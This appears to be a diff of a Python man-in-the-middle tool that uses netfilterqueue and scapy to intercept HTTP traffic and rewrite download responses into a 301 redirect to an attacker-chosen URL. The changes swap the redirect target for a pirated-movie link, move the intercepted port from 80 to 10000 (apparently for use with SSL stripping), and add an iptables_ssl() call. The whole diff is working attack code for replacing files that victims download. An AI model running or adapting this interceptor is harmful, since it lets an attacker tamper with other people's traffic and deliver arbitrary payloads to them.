@@ -5,7 +5,7 @@ import netfilterqueue
 import scapy.all as scapy
 import argparse
 
-url = "http://dl3.downloadly.ir/Files/Elearning/Udemy_Learn_Photoshop_Web_Design_Profitable_Freelancing_2020-3.part4_Downloadly.ir.rar"
+url = "http://dl8.hub30t.com/f/Scare.Me.2020.720p.WEB-DL.GalaxyRG.MOVIE30T.PW.mkv"
 
 
 def get_argument():
@@ -40,11 +40,11 @@ def process_packet(packet):
     if http_packet.haslayer(scapy.Raw):
         if http_packet.haslayer(scapy.TCP):
             options = get_argument()
-            if http_packet[scapy.TCP].dport == 80:
+            if http_packet[scapy.TCP].dport == 10000:
                 if options.file:
                     print(f"{options.file} Request...")
                     ack_list.append(http_packet[scapy.TCP].ack)
-            elif http_packet[scapy.TCP].sport == 80:
+            elif http_packet[scapy.TCP].sport == 10000:
                 if http_packet[scapy.TCP].seq in ack_list:
                     http_packet[
                         scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {url}\n\n"
@@ -61,6 +61,7 @@ def process_packet(packet):
 
 try:
     iptables()
+    iptables_ssl()
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
